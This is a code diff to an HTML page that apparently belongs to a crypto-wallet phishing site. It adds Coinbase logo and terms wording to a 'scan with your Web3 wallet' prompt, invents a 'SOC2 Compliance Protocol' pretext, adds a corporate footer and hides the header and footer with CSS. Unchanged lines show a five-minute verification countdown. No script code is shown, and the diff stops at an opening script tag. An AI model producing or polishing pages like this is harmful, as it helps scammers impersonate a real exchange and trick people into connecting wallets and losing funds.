@@ -182,6 +182,7 @@
     .header {
         text-align: center;
         margin-bottom: 1rem;
+display: none !important;
     }
 
     .badge {
@@ -718,6 +719,22 @@
         user-select: none;
     }
 
+                footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            padding: 18px 0;
+            font-size: 14px;
+            color: #555;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(12px);
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
+            z-index: 6;
+display: none !important;
+        }
+
     @media screen and (max-width: 768px) {
         .sig-table { display: block !important; width: 100% !important; }
         .sig-row { display: block !important; }
@@ -816,9 +833,10 @@
             </button>
         </div>
 
-        <div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: left; margin-top: 10px;">
-           By scanning using a Web3 CEX wallet, you agree to Coinbase's 
-            <a href="https://www.coinbase.com/legal/user_agreement/united_states" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Terms of Service</a>.
+        <div class="terms-disclosure" style="font-size: 12px; color: #666; text-align: left; margin-top: 10px; justify-content: center; gap: 8px;">
+           By scanning using a Web3 wallet, you agree to <img src="assets/pictures/download.png" alt="Coinbase" style="width: 16px; height: 16px; object-fit: contain;">
+    <span>Coinbase's 
+            <a href="https://www.coinbase.com/legal/user_agreement/united_states" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Terms of Service</a></span> for the SOC2 Compliance Protocol on this Visual Architecture Suite (Phase 1).
         </div>
 
         <p id="eth-timer" style="display: none;">Verification expires in 05:00</p>
@@ -876,6 +894,10 @@
     <span>Coinbase • SOC2 Compliance Protocol</span>
 </div>
 </div>
+
+    <footer>
+       © 2026 AvalonFlow Corp • All Rights Reserved
+    </footer>
 
 </body>
 <script>
